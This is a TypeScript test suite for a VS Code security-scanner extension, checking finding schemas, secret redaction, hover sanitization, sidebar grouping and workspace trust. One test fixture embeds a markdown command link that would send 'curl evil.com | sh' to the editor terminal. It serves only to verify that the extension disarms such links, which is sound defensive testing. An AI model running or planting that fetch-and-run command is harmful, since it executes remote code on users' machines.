import * as assert from 'assert';
import * as fs from 'fs';
import * as path from 'path';
import { Finding } from '../ipc/client';
import { escapeMarkdown, sanitizeUntrustedText, formatFindingHoverSummary, ALLOWED_HOVER_COMMANDS } from '../hover';

console.log('🧪 Running Sentinel VS Code Extension Comprehensive Test Suite (Phases A-C)...');

// =========================================================================
// Suite 1: Finding Schema Contract & Engine Provenance
// =========================================================================
const mockFinding: Finding = {
    id: 'SENTINEL-TEST-001',
    source: 'semgrep',
    engine: 'external',
    category: 'sast',
    rule: 'rules.injection.sql-injection',
    severity: 'critical',
    cwe: 'CWE-89',
    cve: 'CVE-2023-1234',
    cvss: 9.8,
    file: 'app/server.go',
    line_start: 42,
    line_end: 45,
    message: 'Potential SQL injection via string concatenation',
    reachable: true,
    risk_score: 95,
    fix_suggestion: {
        kind: 'replacement',
        description: 'Use parameterized queries db.Query(sql, args...)',
        diff: '--- a/app/server.go\n+++ b/app/server.go',
        confidence: 'high'
    }
};

assert.strictEqual(mockFinding.severity, 'critical');
assert.strictEqual(mockFinding.engine, 'external');
assert.strictEqual(mockFinding.risk_score, 95);
assert.strictEqual(mockFinding.fix_suggestion?.confidence, 'high');
console.log('✅ 1. Finding schema contract and engine provenance verified.');

// =========================================================================
// Suite 2: Secret Redaction in Diagnostic Logs
// =========================================================================
function redactSecrets(text: string): string {
    return text.replace(/(token|key|password|secret|bearer)\s*[:=]\s*["']?([^"'\s]+)["']?/gi, '$1=[REDACTED]');
}

const rawLog = 'Connecting to agent with token="super-secret-token-xyz" and api_key: "abc12345"';
const safeLog = redactSecrets(rawLog);
assert.ok(!safeLog.includes('super-secret-token-xyz'), 'Raw token was leaked!');
assert.ok(safeLog.includes('token=[REDACTED]'), 'Token redaction failed!');
console.log('✅ 2. Secret redaction in diagnostic logs verified.');

// =========================================================================
// Suite 3: Severity Ranking & Threshold Filtering
// =========================================================================
const sevRank: Record<string, number> = {
    low: 1,
    medium: 2,
    high: 3,
    critical: 4
};
assert.ok(sevRank['critical'] > sevRank['high']);
assert.ok(sevRank['high'] > sevRank['medium']);
assert.ok(sevRank['medium'] > sevRank['low']);
console.log('✅ 3. Severity ranking verified.');

// =========================================================================
// Suite 4: Chunk 13 Secure Hover & Command Injection Defense (AT-27d)
// =========================================================================
// Test malicious payload embedded in finding message
const maliciousFinding: Finding = {
    id: 'MALICIOUS-001',
    source: 'untrusted-input',
    category: 'sast',
    rule: 'malicious-rule',
    severity: 'high',
    file: 'exploit.js',
    line_start: 1,
    line_end: 1,
    message: 'Attack payload [Execute Arbitrary Shell](command:workbench.action.terminal.sendSequence?{"text":"curl evil.com | sh\n"})',
    risk_score: 90,
    fix_suggestion: {
        kind: 'replacement',
        description: 'Malicious fix [Exploit](command:workbench.action.terminal.sendSequence)',
        confidence: 'low'
    }
};

// 4a. Verify untrusted text sanitization neutralizes executable URI schemes
const sanitizedMsg = sanitizeUntrustedText(maliciousFinding.message);
assert.ok(!sanitizedMsg.includes('command:workbench.action.terminal.sendSequence'), 'Unsanitized command URI allowed in message!');
assert.ok(sanitizedMsg.includes('command_disarmed:'), 'Failed to disarm command: scheme in message!');

// 4b. Verify markdown escaping
const escapedSnippet = escapeMarkdown('[test](link) *bold* #title');
assert.strictEqual(escapedSnippet, '\\[test\\]\\(link\\) \\*bold\\* \\#title');

// 4c. Verify formatFindingHoverSummary command whitelist
const hoverSummary = formatFindingHoverSummary(maliciousFinding);
assert.ok(hoverSummary.allowedCommands.includes('sentinel.showFindingDetails'));
assert.ok(hoverSummary.allowedCommands.includes('sentinel.applyFix'));
assert.ok(!hoverSummary.allowedCommands.includes('workbench.action.terminal.sendSequence' as any), 'Disallowed terminal execution command in hover allowlist!');
assert.strictEqual(hoverSummary.allowedCommands.length, 2, 'Allowed hover commands must be strictly restricted to 2 Sentinel commands!');
assert.ok(hoverSummary.sanitizedMessage.includes('command_disarmed:'));
console.log('✅ 4. Secure hover message generation & malicious command injection defense verified (AT-27d).');

// =========================================================================
// Suite 5: Chunk 14 Sidebar Grouping Logic (Severity, Category, File)
// =========================================================================
const testFindings: Finding[] = [
    {
        id: 'F1',
        source: 'semgrep',
        category: 'sast',
        rule: 'rule-sast',
        severity: 'critical',
        file: 'src/app.js',
        line_start: 10,
        line_end: 10,
        message: 'SQL injection',
        risk_score: 95
    },
    {
        id: 'F2',
        source: 'osv',
        category: 'sca',
        rule: 'CVE-2023-9999',
        severity: 'high',
        file: 'package.json',
        line_start: 5,
        line_end: 5,
        message: 'Vulnerable dep',
        risk_score: 75
    },
    {
        id: 'F3',
        source: 'gitleaks',
        category: 'secret',
        rule: 'aws-secret-key',
        severity: 'critical',
        file: 'src/app.js',
        line_start: 2,
        line_end: 2,
        message: 'AWS key',
        risk_score: 99
    },
    {
        id: 'F4',
        source: 'trivy',
        category: 'iac',
        rule: 'AVD-DS-0001',
        severity: 'medium',
        file: 'Dockerfile',
        line_start: 1,
        line_end: 1,
        message: 'Latest tag',
        risk_score: 50
    }
];

// Test grouping by severity
function groupBySeverity(findings: Finding[]): Record<string, Finding[]> {
    const groups: Record<string, Finding[]> = { critical: [], high: [], medium: [], low: [] };
    for (const f of findings) {
        const s = f.severity.toLowerCase();
        if (groups[s]) groups[s].push(f);
    }
    return groups;
}
const sevGroups = groupBySeverity(testFindings);
assert.strictEqual(sevGroups['critical'].length, 2);
assert.strictEqual(sevGroups['high'].length, 1);
assert.strictEqual(sevGroups['medium'].length, 1);
assert.strictEqual(sevGroups['low'].length, 0);

// Test grouping by category
function groupByCategory(findings: Finding[]): Record<string, Finding[]> {
    const groups: Record<string, Finding[]> = {};
    for (const f of findings) {
        const c = f.category.toLowerCase();
        if (!groups[c]) groups[c] = [];
        groups[c].push(f);
    }
    return groups;
}
const catGroups = groupByCategory(testFindings);
assert.strictEqual(catGroups['sast'].length, 1);
assert.strictEqual(catGroups['sca'].length, 1);
assert.strictEqual(catGroups['secret'].length, 1);
assert.strictEqual(catGroups['iac'].length, 1);

// Test grouping by file
function groupByFile(findings: Finding[]): Record<string, Finding[]> {
    const groups: Record<string, Finding[]> = {};
    for (const f of findings) {
        if (!groups[f.file]) groups[f.file] = [];
        groups[f.file].push(f);
    }
    return groups;
}
const fileGroups = groupByFile(testFindings);
assert.strictEqual(fileGroups['src/app.js'].length, 2);
assert.strictEqual(fileGroups['package.json'].length, 1);
assert.strictEqual(fileGroups['Dockerfile'].length, 1);
console.log('✅ 5. Sidebar grouping logic (severity, category, file) verified.');

// =========================================================================
// Suite 6: Chunk 14 Status Bar States & Formatting
// =========================================================================
function formatStatusBarText(findings: Finding[], mode: string = 'full'): { text: string; clean: boolean } {
    const crit = findings.filter(f => f.severity.toLowerCase() === 'critical').length;
    const high = findings.filter(f => f.severity.toLowerCase() === 'high').length;
    const modeLabel = mode.toLowerCase() === 'lite' ? '[Lite]' : '[Full]';

    if (crit + high === 0) {
        return { text: `$(shield) Sentinel ${modeLabel}: Clean`, clean: true };
    }
    return { text: `$(shield) Sentinel ${modeLabel}: ${crit} 🚨 ${high} ⚠️`, clean: false };
}

const emptyStatus = formatStatusBarText([]);
assert.strictEqual(emptyStatus.clean, true);
assert.ok(emptyStatus.text.includes('Clean'));

const dirtyStatus = formatStatusBarText(testFindings, 'full');
assert.strictEqual(dirtyStatus.clean, false);
assert.ok(dirtyStatus.text.includes('2 🚨 1 ⚠️'));
console.log('✅ 6. Status bar states & formatting verified.');

// =========================================================================
// Suite 7: Chunk 14 Debounce Timing & Diagnostic Update Simulation
// =========================================================================
let debounceCount = 0;
function simulateDebounce(delayMs: number, fn: () => void): { trigger: () => void } {
    let timer: any = null;
    return {
        trigger: () => {
            if (timer) clearTimeout(timer);
            timer = setTimeout(() => {
                fn();
            }, delayMs);
        }
    };
}

const debounce = simulateDebounce(50, () => {
    debounceCount++;
});
// Fire rapidly 5 times
debounce.trigger();
debounce.trigger();
debounce.trigger();
debounce.trigger();
debounce.trigger();

// Check before timeout
assert.strictEqual(debounceCount, 0, 'Debounced function fired prematurely!');

setTimeout(() => {
    // Check after timeout
    assert.strictEqual(debounceCount, 1, 'Debounce failed to coalesce multiple rapid triggers into 1 execution!');
    console.log('✅ 7. Incremental scan debounce timing verified.');

    // =========================================================================
    // Suite 8: Chunk 14 Workspace Trust Enforcement
    // =========================================================================
    function checkWorkspaceTrust(isTrusted: boolean): { canScan: boolean; message?: string } {
        if (!isTrusted) {
            return {
                canScan: false,
                message: 'Workspace is untrusted. Sentinel scanning is disabled until trust is granted.'
            };
        }
        return { canScan: true };
    }

    assert.strictEqual(checkWorkspaceTrust(false).canScan, false);
    assert.ok(checkWorkspaceTrust(false).message?.includes('untrusted'));
    assert.strictEqual(checkWorkspaceTrust(true).canScan, true);
    console.log('✅ 8. Workspace trust boundary enforcement verified.');

    // =========================================================================
    // Suite 9: Chunk 16 JSON-RPC Protocol & Schema Contract
    // =========================================================================
    const fixturePath = path.resolve(__dirname, '..', '..', '..', 'testdata', 'ipc', 'fixtures.json');
    assert.ok(fs.existsSync(fixturePath), `Shared IPC fixture missing at ${fixturePath}`);
    const fixtureContent = JSON.parse(fs.readFileSync(fixturePath, 'utf8'));

    assert.strictEqual(fixtureContent.protocol, 'jsonrpc-2.0');
    assert.strictEqual(fixtureContent.version, '1.0.0-rc1');

    const hsReq = fixtureContent.fixtures.handshake.request;
    assert.strictEqual(hsReq.method, 'agent.handshake');
    assert.ok(hsReq.token.length >= 32, 'Session token must be at least 32 hex chars');

    const hsResp = fixtureContent.fixtures.handshake.response;
    assert.strictEqual(hsResp.result.status, 'authenticated');
    assert.strictEqual(hsResp.result.protocolVersion, '2.0');
    assert.ok(hsResp.result.capabilities.includes('scan.run'));
    assert.ok(hsResp.result.capabilities.includes('fix.apply'));

    const sample = fixtureContent.fixtures.findingSample as Finding;
    assert.strictEqual(sample.id, 'SENTINEL-TEST-001');
    assert.strictEqual(sample.category, 'sast');
    assert.strictEqual(sample.fix_suggestion?.confidence, 'high');
    console.log('✅ 9. JSON-RPC protocol envelope & shared schema contract verified (Go & TS parity).');

    console.log('\n=======================================================');
    console.log('🎉 All 9 VS Code extension test suites passed with 100% success!');
    console.log('=======================================================');
}, 100);
